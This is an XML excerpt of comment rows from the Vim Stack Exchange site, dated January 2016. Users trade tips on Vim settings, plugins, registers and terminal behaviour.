  <row Id="9470" PostId="6114" Score="0" Text="Two great solutions. Thanks!" CreationDate="2016-01-13T21:54:12.693" UserId="343" />
  <row Id="9471" PostId="6099" Score="2" Text="If this behavior continues after running `mvim -u NONE -U NONE -N`, and you're not running in fullscreen (or split screen on El Cap), you should probably [file a bug](https://github.com/macvim-dev/macvim) and we'll look at it. Note that there are a few outstanding issues with fullscreen/split-screen right now." CreationDate="2016-01-13T22:09:00.360" UserId="72" />
  <row Id="9472" PostId="6117" Score="0" Text="How is this different from a scratch install, where you put that file into your ~/.vim directory?" CreationDate="2016-01-14T06:24:21.513" UserId="71" />
  <row Id="9473" PostId="6120" Score="2" Text="works for me. Please be more concise in your problem description." CreationDate="2016-01-14T07:08:00.750" UserId="71" />
  <row Id="9474" PostId="6004" Score="2" Text="Ok, thanks. I understand the question better now. I don't have the answer, but I have some hints. Check out `:h formatexpr` - you can define a custom function for the `gq` command. Also check out `:h formatoptions`, which can be used to apply the formatter automatically for various scenarios." CreationDate="2016-01-14T08:37:25.203" UserId="21" />
  <row Id="9475" PostId="6117" Score="0" Text="@ChristianBrabandt Sorry, I don't understand. How is what different from a scratch install? Where I put which file into my ~/.vim directory?" CreationDate="2016-01-14T11:18:17.680" UserId="343" />
  <row Id="9477" PostId="6120" Score="0" Text="@ChristianBrabandt I added an image in op. it seems to have problem around brackets." CreationDate="2016-01-14T14:30:03.093" UserId="6000" />
  <row Id="9478" PostId="6121" Score="1" Text="...and upvoted. ;-) Good luck, and welcome to vi.SE." CreationDate="2016-01-14T14:34:04.107" UserId="1726" />
  <row Id="9479" PostId="6121" Score="2" Text="That is a readline/ipython problem and has nothing to do with vim. Is ipython actually using readline() library?" CreationDate="2016-01-14T15:27:37.950" UserId="71" />
  <row Id="9480" PostId="6122" Score="0" Text="thank you very much!" CreationDate="2016-01-14T16:34:45.770" UserId="6000" />
  <row Id="9481" PostId="6111" Score="0" Text="I like the idea of an abbreviation, I'll have to play around with that." CreationDate="2016-01-14T17:15:20.160" UserId="1402" />
  <row Id="9482" PostId="6121" Score="0" Text="_Given a properly built Python, the basic interactive IPython shell will work with no external dependencies. However, some Python distributions (particularly on Windows and OS X), don’t come with a working readline module. The IPython shell will work without readline, but will lack many features that users depend on, such as tab completion and command line editing._ [source](https://ipython.org/ipython-doc/3/install/install.html) Tab completion works so ... Yes." CreationDate="2016-01-14T17:25:44.547" UserId="6006" />
  <row Id="9485" PostId="6126" Score="0" Text="I updated the question with my VIM version. And will try to update to 7.4." CreationDate="2016-01-14T17:55:57.630" UserId="5944" />
  <row Id="9486" PostId="6121" Score="0" Text="I'm voting to close this question as off-topic because it's not about vi or Vim. It is, in fact, on-topic on Stack Overflow, and asking it there was the correct thing to do." CreationDate="2016-01-14T18:09:25.300" UserId="51" />
  <row Id="9487" PostId="6102" Score="0" Text="Cool. Would you mind explaining a few bits of it? What is `o` (operator pending mode) in onoremap? What does `o` in visual mode do? I would guess that it is &quot;other side&quot;, because it seems to jump to the other side of a selection... How do i find `:h`on it? I can't find it with `:h x_o` or `:h o`." CreationDate="2016-01-14T18:14:27.913" UserId="2082" />
  <row Id="9488" PostId="6126" Score="1" Text="@NelsonTeixeira From [`:help fixed-7.4`](http://vimhelp.appspot.com/version7.txt.html#fixed%2d7%2e4): &quot;Patch 7.3.694 [..] Add the shiftwidth() function&quot;. So yeah, you need  a newer Vim version (path 7.3.694 or higher)." CreationDate="2016-01-14T18:14:39.897" UserId="51" />
  <row Id="9489" PostId="6126" Score="0" Text="7.4 is compiled against a different ruby version. when installed breaks my command-t plugin. I'll try to update to a higher 7.3 branch." CreationDate="2016-01-14T18:16:14.363" UserId="5944" />
  <row Id="9490" PostId="6126" Score="1" Text="@NelsonTeixeira It sounds to me that fixing Command-T is the way to go, rather than stick with an old version forever ;-)" CreationDate="2016-01-14T18:17:12.667" UserId="51" />
  <row Id="9491" PostId="6126" Score="0" Text="Coporate desktop. Some things are linked to other things. Updating ruby version is not an option." CreationDate="2016-01-14T18:20:22.143" UserId="5944" />
  <row Id="9492" PostId="5246" Score="0" Text="Bonus tip: This also works with `f` and friends (`F`, `t`, `T`, `;`): e.g. `2fx` will get you to the second `x`, or `2;` will repeat the last `f` twice." CreationDate="2016-01-14T18:21:23.313" UserId="51" />
  <row Id="9493" PostId="6126" Score="0" Text="@NelsonTeixeira Okay, that can be difficult :-) You can try using the work-around described in [`:help shiftwidth()`](http://vimhelp.appspot.com/eval.txt.html#shiftwidth%28%29) btw. I see this plugin doesn't have many updates, so modifying it locally is probably okay." CreationDate="2016-01-14T18:26:58.800" UserId="51" />
  <row Id="9494" PostId="5988" Score="0" Text="I've gone ahead and made one: https://github.com/BatmanAoD/pruss-vim" CreationDate="2016-01-14T19:12:05.673" UserId="1060" />
  <row Id="9496" PostId="6126" Score="0" Text="I tried... I putted it in a .vim file the .vim/plugin folder and it didn't work. In the plugin's file where it calls it, also didn't work. where do I put this workaround code ?" CreationDate="2016-01-14T19:14:36.267" UserId="5944" />
  <row Id="9497" PostId="5089" Score="0" Text="Kyle, feel free to create a plugin... just don't forget to share... :-) Bryan" CreationDate="2016-01-14T19:00:02.683" UserId="5829" />
  <row Id="9498" PostId="6102" Score="0" Text="Explanation added." CreationDate="2016-01-14T20:23:56.920" UserId="54" />
  <row Id="9499" PostId="6126" Score="0" Text="@NelsonTeixeira Use the function from :h shiftwidth(), put it into the plugin file and make sure to have the quoted line above call your modified function." CreationDate="2016-01-14T20:28:44.587" UserId="71" />
  <row Id="9500" PostId="6126" Score="1" Text="@NelsonTeixeira alternatively, replace every shiftwidth() function call by the shiftwidth option, e.g. this part: ` &quot;s&quot;.shiftwidth()` by `&quot;s&quot;.&amp;sw` should also work (needs to be done everywhere)." CreationDate="2016-01-14T21:39:31.713" UserId="71" />
  <row Id="9501" PostId="6126" Score="0" Text="when I substitued by &quot;s&quot;.&amp;sw it finally worked. Thanks" CreationDate="2016-01-14T22:28:30.960" UserId="5944" />
  <row Id="9502" PostId="6128" Score="1" Text="Your answers are always poignant and address the real problem! In fact, `exclude` was the keyword that I needed. I _did_ search for `ignore` and for `file` as well before posting, but I did not go for the synonyms. **Thank you for teaching me to fish, and not simply throwing me fishes!**" CreationDate="2016-01-15T09:00:03.990" UserId="989" />
  <row Id="9503" PostId="2156" Score="0" Text="You shouldn't need the `set t_Co` line in your vimrc: Vim can read this value from the terminal (Setting `'t_Co'` seems to be a bit of a Vim cargo cult: lots of people online recommend doing so without really understanding the issues they're attempting to solve.)" CreationDate="2016-01-15T10:50:38.690" UserId="343" />
  <row Id="9504" PostId="6129" Score="0" Text="Hmmm. What does `:verbose set background` report?" CreationDate="2016-01-15T10:58:19.660" UserId="343" />
  <row Id="9506" PostId="5954" Score="0" Text="Is there any chance your cursor background is just set to be the same colour as your background? What does `:highlight cursor` report" CreationDate="2016-01-15T11:56:55.777" UserId="343" />
  <row Id="9507" PostId="5950" Score="1" Text="Elaborating on what @Carpetsmoker said, try searching for `t_EI` setting in your .vimrc, which causes a terminal escape sequence to be sent when leaving insert mode." CreationDate="2016-01-15T12:00:49.653" UserId="343" />
  <row Id="9508" PostId="3934" Score="0" Text="I know this isn't what you mean, but you could also [contribute *monetarily*](http://www.vim.org/sponsor/index.php) to Vim." CreationDate="2016-01-15T12:05:26.933" UserId="343" />
  <row Id="9509" PostId="6130" Score="1" Text="This is a good suggestion, but I really like my text physically formatted --- so that I can have a glance using `less`, or `cat` it, or whatever..." CreationDate="2016-01-15T12:17:03.533" UserId="854" />
  <row Id="9510" PostId="6130" Score="0" Text="@Rmano Hopefully someone will be along soon to explain how you can get a more direct solution working with `'formatexpr'` (Or you figure it out for yourself.)" CreationDate="2016-01-15T12:35:25.870" UserId="343" />
  <row Id="9511" PostId="6129" Score="0" Text="Thanks Boris Serebrov! It certainly is working. It's really nice and it's making so much difference in quality of work!" CreationDate="2016-01-15T13:46:37.373" UserId="4617" />
  <row Id="9512" PostId="6129" Score="0" Text="There is still a small nuance that's bugging me. The mapping togs well between dark/light using the script you drop earlier (now in my ~/.vimrc). The problem now (really a small issue) is that when I manually execute `:set background?` does not give always the right answer: it might be really a light screen and the cmdline reports dark and vice versa. Any suggestion why that might be and how to fix it please?" CreationDate="2016-01-15T13:54:17.600" UserId="4617" />
  <row Id="9513" PostId="6129" Score="0" Text="@Rich the `:verbose set background` says `Last set from ~/.vim/plugged/vim-colors-solarized/colors/solarized.vim` and this also confirms that calling `colorscheme solarized` also changes the background." CreationDate="2016-01-15T14:06:23.023" UserId="6013" />
  <row Id="9514" PostId="6129" Score="1" Text="@AnnisMonadjem my solution is a workaround to the problem of `background` being set incorrectly. I would also prefer it to have correct value and then your initial code would just work and additional `mybg` variable would be not needed. I think you can try to report this issue to the vim-colors-solarized developers, maybe they will be able to fix it." CreationDate="2016-01-15T14:08:35.170" UserId="6013" />
  <row Id="9515" PostId="6131" Score="2" Text="ysiW)     -&gt;The `W` must be capitalized which forces it to surround around the `'`. Finally use `)` instead of `(` which surrounds it the way you were asking. Good luck." CreationDate="2016-01-15T14:18:02.383" UserId="4617" />
  <row Id="9516" PostId="6131" Score="0" Text="What if the string has multiple words in it?" CreationDate="2016-01-15T14:19:36.907" UserId="6018" />
  <row Id="9517" PostId="6131" Score="2" Text="check out `:h surround` (great tutorial and few of nice examples including answer to your question)." CreationDate="2016-01-15T14:37:24.267" UserId="4617" />
  <row Id="9518" PostId="6129" Score="0" Text="Thanks @BorisSerebrov" CreationDate="2016-01-15T14:41:01.740" UserId="4617" />
  <row Id="9519" PostId="6129" Score="0" Text="@AnnisMonadjem Also worth noting that this answer doesn't attempt to address the weird issue of what is setting your `colorscheme` back to `default` when `background` is set from a function (but not when you set it manually). It works around this issue, too." CreationDate="2016-01-15T15:24:49.720" UserId="343" />
  <row Id="9520" PostId="6131" Score="0" Text="Hmmm. `ysa')` seems to work correctly for me. If your cursor is on the opening `'`, then `ysf')` also works." CreationDate="2016-01-15T16:26:23.523" UserId="343" />
  <row Id="9521" PostId="6131" Score="0" Text="Not if you have whitespace leading the string" CreationDate="2016-01-15T16:26:51.670" UserId="6018" />
  <row Id="9522" PostId="6131" Score="0" Text="@Eldamir I do have whitespace before the first quote. I tested it when the string is in the middle of a line, and when it's at the start of a space or tab indented line." CreationDate="2016-01-15T16:29:12.320" UserId="343" />
  <row Id="9523" PostId="5955" Score="2" Text="I'm confused; do you want to move a set of lines *to* a specific place in the document, preserving existing lines by shifting or swapping them? Or do you want to move lines and delete intervening or replacing lines? Can you provide a concrete example of your task?" CreationDate="2016-01-15T16:50:52.967" UserId="72" />
  <row Id="9525" PostId="6134" Score="1" Text="How does this work for you: `inoremap &lt;c-z&gt; &lt;esc&gt;:stop&lt;cr&gt;` ? Or `inoremap &lt;c-z&gt; &lt;esc&gt;&lt;c-z&gt;` See `:h CTRL-Z`" CreationDate="2016-01-15T17:14:13.273" UserId="1800" />
  <row Id="9526" PostId="6129" Score="0" Text="@Rich actually for me `colorscheme` resets back to `default` even when set manually. I start with dark background and solarized scheme, the `:set bg?` reports `background=light`. If I then do `set background=dark` the colorscheme resets to `default`." CreationDate="2016-01-15T18:42:54.840" UserId="6013" />
  <row Id="9527" PostId="6134" Score="0" Text="Works great.  Please make this into an answer" CreationDate="2016-01-15T19:17:11.490" UserId="5919" />
  <row Id="9528" PostId="6129" Score="0" Text="@BorisSerebrov Ah, okay. Even so, it's still weird! I don't know of any mechanism that could cause that, so I'd love to find out what's doing so." CreationDate="2016-01-15T19:30:37.493" UserId="343" />
  <row Id="9529" PostId="6129" Score="0" Text="@Rich actually it looks like a vim behavior, even if I start it as `vim -u NONE -U NONE`, the colorscheme still resets to default when I change the background between dark and light. Update: it is true only for terminal vim, colorscheme doesn't resets in gvim." CreationDate="2016-01-15T19:42:09.390" UserId="6013" />
  <row Id="9530" PostId="6136" Score="0" Text="Did you read *all* of `:help 'list'` and `:help 'listchars'`?" CreationDate="2016-01-15T19:49:51.400" UserId="54" />
  <row Id="9531" PostId="6129" Score="0" Text="@BorisSerebrov Oh yes, there it is in `:h 'background'`. Not sure how I missed that before!" CreationDate="2016-01-15T21:34:19.033" UserId="343" />
  <row Id="9532" PostId="5954" Score="0" Text="No, the cursor wasn't the same color as the background I think I've checked that back then. Currently I solved the issue by compiling vim in cygwin and using cygwin connector made by maximus in order to add 256 color support. My cursor seems to be working now but a different issue appeared and that is that my mouse doesn't work properly. I can't seem to select things, resize windows etc with it. However my scrollwheel does seem to work. in :version it says +mouse so I do have the support from compiling it. Anyways I'll just deal with it." CreationDate="2016-01-15T21:41:49.340" UserId="5780" />
  <row Id="9533" PostId="6139" Score="0" Text="i meant to write `col('.')` on the second argument, small mistake. I've just noticed it returns an empty string because the newly opened line has no text. Is there a way around this? i really need it" CreationDate="2016-01-16T12:53:16.910" UserId="6036" />
  <row Id="9534" PostId="6138" Score="1" Text="*If* I remember correctly, when in insert mode try to use `col('.') - 1` or similar, to check *before* the character you are actually just inserting. Ah, I see that Christian's answer suggests exactly that." CreationDate="2016-01-16T19:42:15.903" UserId="1800" />
  <row Id="9536" PostId="6139" Score="0" Text="why do you need this in a new line?" CreationDate="2016-01-17T13:06:20.657" UserId="71" />
  <row Id="9537" PostId="6043" Score="0" Text="Hey, as i wrote the comment, i didn't understand correctly how markdown works, so my request (the above without generating newlines) wouldn't have been possible." CreationDate="2016-01-17T15:03:54.320" UserId="2354" />
  <row Id="9538" PostId="6141" Score="0" Text="One question per post, please." CreationDate="2016-01-17T17:38:27.360" UserId="205" />
  <row Id="9539" PostId="6143" Score="2" Text="Since this is asking for plugin recommendations, please do follow [softwarerecs.se]'s [guidelines](http://meta.softwarerecs.stackexchange.com/questions/336/what-is-required-for-a-question-to-contain-enough-information) - specifically: &quot;even if you're asking for alternatives, we need to know which features you need.&quot; I have no idea what Scrivener is, and may be someone here who hasn't used Scrivener but uses a similar plugin would be lost as well. Also see: http://meta.vi.stackexchange.com/q/118/205" CreationDate="2016-01-17T18:06:39.780" UserId="205" />
  <row Id="9540" PostId="6074" Score="0" Text="I'm curious: should that be `histdel('/', -1)` or `histdel('search', -1)`?" CreationDate="2016-01-17T18:38:17.293" UserId="205" />
  <row Id="9541" PostId="6141" Score="0" Text="This should instead have been opened as an issue for vimtex, although the latter two questions are answered in the documentation. To use `lualatex`, you only need to configure your `.latexmkrc` correctly." CreationDate="2016-01-17T20:33:36.467" UserId="21" />
  <row Id="9542" PostId="6074" Score="0" Text="@muru, both values are correct, use the one you prefer. See `:help hist-names`." CreationDate="2016-01-17T20:43:17.047" UserId="54" />
  <row Id="9543" PostId="6143" Score="0" Text="Good links -- thanks for pointing them out. I'll try to refactor my question so that it better matches the recommendations you linked to." CreationDate="2016-01-18T01:24:07.040" UserId="4748" />
  <row Id="9544" PostId="5846" Score="0" Text="I've [fixed this](https://github.com/airblade/vim-gitgutter/commit/a871d857d079bef8e610cc8d30b9c3b5abd22e79) now; the buffer numbers no longer increment so rapidly." CreationDate="2016-01-18T10:32:55.160" UserId="1643" />
  <row Id="9545" PostId="6148" Score="0" Text="See also https://github.com/neovim/neovim/pull/4036, which might be related." CreationDate="2016-01-18T12:32:00.480" UserId="1296" />
  <row Id="9546" PostId="5954" Score="0" Text="Are your `'mouse'` and `'ttymouse'` settings correct?" CreationDate="2016-01-18T15:06:43.427" UserId="343" />
  <row Id="9547" PostId="5845" Score="0" Text="@VanLaser If neither of you adds this as an answer, I'm going to. (Having solved issues in &quot;Unanswered&quot; is untidy!)" CreationDate="2016-01-18T15:11:17.223" UserId="343" />
  <row Id="9548" PostId="6143" Score="0" Text="It's not entirely sure to me what exactly you're looking for, perhaps that's because I've never used Scrivener. &quot;Edit a document in multiple parts&quot; can be done by simply have several files in a directory. &quot;Compiling&quot; them to a single document is simply appending them all to one document, and rearranging files can be done my renaming them (e.g. you could prefix them with a number: `10-introduction`, `20-first-chapter`, etc.)" CreationDate="2016-01-18T15:11:30.707" UserId="51" />
  <row Id="9549" PostId="6035" Score="0" Text="@saginaw, symbolix: If neither of you adds this as an answer, I'm going to. (Having solved issues in &quot;Unanswered&quot; is untidy!" CreationDate="2016-01-18T15:12:39.263" UserId="343" />
  <row Id="9550" PostId="5845" Score="0" Text="From my point, do it :)" CreationDate="2016-01-18T15:18:01.077" UserId="1800" />
  <row Id="9551" PostId="6156" Score="1" Text="Note that this will only ever match something if the file has mixed line endings." CreationDate="2016-01-18T19:37:34.497" UserId="15" />
  <row Id="9552" PostId="6139" Score="0" Text="For correct indentation when in a multiline string for example. Why does `synID` fail exactly when there's no content on the line? How else would one detect whether they are in a string or code section?" CreationDate="2016-01-18T20:34:44.070" UserId="6036" />
  <row Id="9553" PostId="6139" Score="0" Text="I think, use col('.') -1 if available. Because in insert mode with col('.') you are outside of any context." CreationDate="2016-01-19T01:49:08.420" UserId="71" />
  <row Id="9554" PostId="6161" Score="0" Text="Many thanks, @garyjohn.  I'm actually using Evil not Vim and found out that the \%V atom is not supported there.  Bummer.  For those who are interested, the relevant feature request is [here](https://bitbucket.org/lyro/evil/issues/610/v-atom-for-restricting-search-and-replace)." CreationDate="2016-01-19T03:06:55.130" UserId="6066" />
  <row Id="9555" PostId="6159" Score="0" Text="is there any way i can force it to use the one character ^[ as an escape? I have confirmed that this is not the problem, the Ctrl+V followed by Esc outputs the ^[ in a lighter looking font, for sure that's the escape key, yet instead of escaping i'm getting `è`" CreationDate="2016-01-19T03:48:34.737" UserId="2541" />
  <row Id="9557" PostId="6147" Score="0" Text="It works until reaching the last top level heading at which point it surrounds the last top level heading with quotes, doesn't add the comma, and joins it with the previous line, leaving the last set of subheadings intact.  &#xA;&#xA;So I get:&#xA;&#xA;    &quot;&quot;* topic 1&quot;, &quot;** subheading&quot;, &quot;** another&quot;, &quot;*** another&quot;&quot;, &quot;* topic 2&quot;&#xA;    ** subheading&#xA;    *** subsubheading&#xA;    *** subsubheading 2&#xA;    ** another subheading&#xA;&#xA;&#xA;In `/\n\*[^*] \| \%$` should there be spaces on either side of `\|`?  It looks like the pattern only matches with no space to the left of `\|` and a space to the right of it." CreationDate="2016-01-19T05:26:37.973" UserId="6053" />
  <row Id="9558" PostId="6154" Score="0" Text="It appears to have worked beautifully - thank you!" CreationDate="2016-01-19T05:35:03.003" UserId="6053" />
  <row Id="9559" PostId="6159" Score="0" Text="I gave you the right answer to your question. Why, how and when you get that è is another matter. Please ask another question." CreationDate="2016-01-19T06:15:18.240" UserId="54" />
  <row Id="9560" PostId="6156" Score="0" Text="@jamessan, do you mean a file which is edited in vim without the `ffs` option set to `unix`? Right now I checked a file, which had only windows eol (that is no mix) and everything was highlighted fine. I suppose that the `ffs` option is relevant here, because only with it I have managed to show carriage return characters." CreationDate="2016-01-19T06:54:16.333" UserId="2798" />
  <row Id="9561" PostId="6164" Score="0" Text="The exact same command works for me." CreationDate="2016-01-19T07:11:13.040" UserId="71" />
  <row Id="9562" PostId="667" Score="0" Text="does anyone know a unicode character with a line on the left and a dot in the center? If one uses spaces for indentation and utf-8 encoded files it will look like it does in Sublime text and Komodo edit." CreationDate="2016-01-19T08:05:21.920" UserId="2798" />
  <row Id="9563" PostId="5845" Score="0" Text="@jpmath Regarding clearing highlights with `&lt;Esc&gt;`, you might like to read the following question and its answers, too: https://vi.stackexchange.com/questions/2614/why-does-this-esc-nmap-affect-startup." CreationDate="2016-01-19T09:21:43.053" UserId="343" />
  <row Id="9564" PostId="6164" Score="0" Text="`:python command will act as python3` ... is that possible without mapping `:python` to `:python3`?" CreationDate="2016-01-19T10:06:09.767" UserId="205" />
  <row Id="9565" PostId="6147" Score="0" Text="You're right, there should be no spaces in the search pattern, I fixed it." CreationDate="2016-01-19T11:48:52.093" UserId="1296" />
  <row Id="9566" PostId="6166" Score="1" Text="&quot;`0 down vote favorite I am a huge (...)&quot;` hmmmm.... copy/paste:  http://stackoverflow.com/questions/34875417/" CreationDate="2016-01-19T11:51:13.663" UserId="1405" />
  <row Id="9567" PostId="6166" Score="0" Text="That question is also asked by me.." CreationDate="2016-01-19T11:54:32.760" UserId="6068" />
  <row Id="9568" PostId="6166" Score="0" Text="That question was also asked by me. But i learned that i can get answer more quickly on Vim Beta community." CreationDate="2016-01-19T11:55:59.337" UserId="6068" />
  <row Id="9570" PostId="6156" Score="0" Text="Ah, so you're specifically setting `'ffs'` in such a way that Vim will never detect a file as having dos line endings, so that you can highlight them?  Why not just put something in your statusline to show what the fileformat is, so you know when it's dos vs. unix?" CreationDate="2016-01-19T14:39:58.990" UserId="15" />
  <row Id="9571" PostId="6144" Score="0" Text="I actually did try this, but I must have mistyped, 'cause it certainly works. Thanks mate" CreationDate="2016-01-19T14:47:50.247" UserId="6018" />
  <row Id="9572" PostId="6156" Score="0" Text="@jamessan, I actually don't know what can I put into the status line, in this case, I'm very new to vim. I just always work with &quot;unix&quot; files, but sometimes it can happen that windows eols are used (which is not proper in my environment) by someone else, so I wanted a way to spot such situations immediately." CreationDate="2016-01-19T15:03:23.430" UserId="2798" />
  <row Id="9573" PostId="6164" Score="0" Text="@muru: I'm not sure. Regardless, in order to get jedi-vim to work, I need python 3 to be the default version in vim, and I'm not sure how to make that happen." CreationDate="2016-01-19T15:57:32.693" UserId="6067" />
  <row Id="9574" PostId="6172" Score="2" Text="You can use `:r!find some_dir -type f` for a recursive listing (you can optionally add `-maxdepth` to only find files up to a certain depth)." CreationDate="2016-01-19T17:49:48.213" UserId="51" />
  <row Id="9575" PostId="6175" Score="0" Text="Thank you, this works as the first answer's approach does, but the problem in some plugin logic. It does not accept such values at all, instead in some bug threads on Github the only advice I could find was to copy a glyph via Ctrl-c/Ctrl-v. So now I'm going to change an existing similar glyph instead of assigning one to an unused code point." CreationDate="2016-01-19T18:41:29.710" UserId="2798" />
  <row Id="9576" PostId="6175" Score="0" Text="@user907860 Copying a character or inserting it with `&lt;C-v&gt;` has the same result." CreationDate="2016-01-19T19:02:30.270" UserId="51" />
  <row Id="9577" PostId="6175" Score="0" Text="thank you for noting that, now I found the cause. I tried to add the new glyph to a wrong code point. It should be U+E000" CreationDate="2016-01-19T19:12:04.973" UserId="2798" />
  <row Id="9578" PostId="6142" Score="0" Text="Does this happen with other terminals you've tried, or only one?" CreationDate="2016-01-19T22:27:12.167" UserId="4932" />
  <row Id="9579" PostId="6143" Score="0" Text="Definitely true, and I've used some of those options in the past, but they've always been pretty clunky. It's a hassle to figure out name changes if you've got a lot of parts, and compiling them also seems like a manual process. Since it sounds like there's nothing like this available, I'll probably close this question in a bit. Thanks for the input." CreationDate="2016-01-20T00:24:48.317" UserId="4748" />
  <row Id="9580" PostId="6177" Score="3" Text="Maybe you could define a custom command inside your vimrc, like this: `command! Private set history=0 nobackup secure ...`, and then call it from the shell with `vim +'Private'`. Concerning the last autocommand you mentioned, when a buffer is read, it tests whether the value of the `'cryptmethod'` option, or `'cm'` for the short version, is non empty. This option controls the encryption method used to encrypt the buffer when it's written to a file with the Ex command `:X`. If the option is not empty, then the autocommand sets up various options." CreationDate="2016-01-20T02:39:03.737" UserId="4939" />
  <row Id="9581" PostId="6177" Score="5" Text="I vote for `vim -Nu .vimrcprivate`." CreationDate="2016-01-20T06:08:08.973" UserId="54" />
  <row Id="9582" PostId="6182" Score="5" Text="Did you see statox's answer? Because that seems like something that would work for you!" CreationDate="2016-01-20T07:34:31.460" UserId="51" />
  <row Id="9583" PostId="6182" Score="3" Text="Use `cw` and then paste/put from your register?" CreationDate="2016-01-20T07:59:08.127" UserId="71" />
  <row Id="9584" PostId="6182" Score="3" Text="Just in case, are you aware that you can open remote files with vim? See `:h scp`" CreationDate="2016-01-20T09:51:08.643" UserId="626" />
  <row Id="9588" PostId="6185" Score="0" Text="what I get from `4verbose setlocal equalprg indentexpr` is this: `equalprg= indentexpr=`" CreationDate="2016-01-20T14:19:01.753" UserId="6086" />
  <row Id="9589" PostId="6184" Score="2" Text="Make sure you have set `:filetype plugin indent on` The indent part is important" CreationDate="2016-01-20T14:19:06.553" UserId="71" />
  <row Id="9590" PostId="6182" Score="0" Text="@Carpetsmoker yes I saw it, but I was hoping for something less typey." CreationDate="2016-01-20T14:26:40.130" UserId="2221" />
  <row Id="9591" PostId="6182" Score="0" Text="@ChristianBrabandt doesn't `cw` overwrite the default register immediately?" CreationDate="2016-01-20T14:28:11.857" UserId="2221" />
  <row Id="9592" PostId="6182" Score="0" Text="@SuperScript I think it does, that's why I said put from your register (by which I meant to have your data stored in an extra register beforehand)" CreationDate="2016-01-20T14:41:22.720" UserId="71" />
  <row Id="9593" PostId="6184" Score="1" Text="What's the output of `:scriptnames` after you open an HTML file?" CreationDate="2016-01-20T15:47:22.443" UserId="205" />
  <row Id="9594" PostId="6166" Score="0" Text="What was the command you used for compiling YCM?" CreationDate="2016-01-20T15:50:36.603" UserId="205" />
  <row Id="9595" PostId="6177" Score="3" Text="How about a combination of 4 and 1,2 or 3? `alias vimprivate='vim -u .vimrcprivate'` etc." CreationDate="2016-01-20T16:04:39.333" UserId="4655" />
  <row Id="9596" PostId="6187" Score="2" Text="Possible duplicate of [How to replace a word with a yanked word in normal mode](http://vi.stackexchange.com/questions/3328/how-to-replace-a-word-with-a-yanked-word-in-normal-mode)" CreationDate="2016-01-20T16:52:30.197" UserId="343" />
  <row Id="9597" PostId="6177" Score="6" Text="Another method is to symlink vim to another name such as vimp, then test `v:progname == &quot;vimp&quot;` and if true, execute your private-mode settings. See `:help v:progname`." CreationDate="2016-01-20T17:00:14.393" UserId="2055" />
  <row Id="9598" PostId="6187" Score="1" Text="@Rich The provided question covers the more general case of replacing a yanked word. I think this question is a bit more specific and does not attract the same answers." CreationDate="2016-01-20T17:30:49.000" UserId="5449" />
  <row Id="9599" PostId="6142" Score="0" Text="In the movie, it is bare xterm. This also is happening in screen inside xterm. What else? konsole? Nope, I didn't tried this, yet." CreationDate="2016-01-20T17:57:40.473" UserId="6039" />
  <row Id="9600" PostId="6166" Score="0" Text="./install.py --tern-completer" CreationDate="2016-01-20T18:03:31.583" UserId="6068" />
  <row Id="9601" PostId="6182" Score="1" Text="What about `Pde`? if you yanked the word word with something like `yw` then in most cases it will include the space after word, so if you move to another word and do `Pde` you will insert new one and erase existing. In some cases you may need `Plde` - paste, move left and then delete util the end." CreationDate="2016-01-20T18:14:21.420" UserId="6013" />
  <row Id="9602" PostId="6143" Score="0" Text="Not sure, but maybe [microviche plugin](https://github.com/q335r49/microviche) can be useful, check also [video](https://www.youtube.com/watch?v=9YNiPUTGO28)" CreationDate="2016-01-20T18:48:22.180" UserId="6013" />
  <row Id="9603" PostId="6177" Score="0" Text="@garyjohn. Your solution is really nice! Works like a charm :)" CreationDate="2016-01-20T18:54:14.753" UserId="6043" />
  <row Id="9604" PostId="6187" Score="0" Text="Protip: The `0` register will contain the last yanked text. `:h quote0`" CreationDate="2016-01-20T20:54:07.640" UserId="778" />
  <row Id="9605" PostId="1940" Score="0" Text="@Carpetsmoker, what's the `&amp;l:cm != &quot;&quot;` all about?" CreationDate="2016-01-20T21:22:40.707" UserId="4676" />
  <row Id="9608" PostId="5711" Score="3" Text="Related: [Simplest way to start Vim in private mode](http://vi.stackexchange.com/questions/6177/simplest-way-to-start-vim-in-private-mode?lq=1)" CreationDate="2016-01-20T21:44:01.807" UserId="6043" />
  <row Id="9609" PostId="5711" Score="3" Text="Related: [Prevent Vim from recording events for certain filetypes](http://vi.stackexchange.com/questions/834/prevent-vim-from-recording-events-for-certain-filetypes?lq=1)" CreationDate="2016-01-20T21:44:25.653" UserId="6043" />
  <row Id="9610" PostId="1940" Score="1" Text="@Wildcard Ehm.... Look like I intended `&amp;cryptmethod`, which refers to that setting. The `l:` part was a mistake (I used my special mod powers to edit my comment). Thanks for pointing that out!" CreationDate="2016-01-20T22:24:14.043" UserId="51" />
  <row Id="9613" PostId="1940" Score="0" Text="@Carpetsmoker, could you please elaborate on your comment? I've created a thread here: http://vi.stackexchange.com/questions/6195/why-an-autocmd-using-cryptmethod-is-a-better-way-to-prevent-vim-from-recording-e" CreationDate="2016-01-20T22:50:43.937" UserId="6043" />
  <row Id="9614" PostId="6142" Score="0" Text="Does it happen also in konsole, then? You should test" CreationDate="2016-01-20T23:35:33.103" UserId="4932" />
  <row Id="9615" PostId="6196" Score="0" Text="You could certainly make a macro/binding that does this.  http://vim.wikia.com/wiki/Reverse_letters is an example" CreationDate="2016-01-21T01:01:36.543" UserId="4932" />
  <row Id="9617" PostId="6187" Score="1" Text="The same idea from the mentioned question's accepted answer can be applied here.  With the cursor in the parentheses, simply press `vi)p`.  It is the same as in that answer, just with the `i)` text object instead of the `w` text object," CreationDate="2016-01-21T02:10:48.427" UserId="865" />
  <row Id="9618" PostId="6142" Score="0" Text="Yes. It does..." CreationDate="2016-01-21T05:49:35.917" UserId="6039" />
  <row Id="9619" PostId="6020" Score="1" Text="To find out what Vim receives, I would skip the `cat` thing and get Vim to tell you directly: `:set &lt;A-d&gt;=CTRL-V ALT-D` You can then yank-paste the line from `q:`" CreationDate="2016-01-21T06:20:06.497" UserId="630" />
  <row Id="9620" PostId="6020" Score="1" Text="Curiously, Vim shows me `^[OD` but cat shows me `^[[D`, but both seem to work when using `:set`." CreationDate="2016-01-21T06:21:03.607" UserId="630" />
  <row Id="9621" PostId="6172" Score="0" Text="As a side note, if you're not into substitutions, you could mark your filenames in vim in blockwise visual mode (&lt;Ctrl&gt;-v), and then type `I&lt;img src=` to insert at the beginning of all lines. This does not work properly for `A` (it will fill up with whitespaces), but you could use `gv` to reselect, then type `:'&lt;,'&gt; normal A&quot;&gt;` to append &quot;&gt; to all lines (you could have done it that way in the first step, using `normal I` instead of `normal A`)." CreationDate="2016-01-21T07:55:25.573" UserId="1296" />
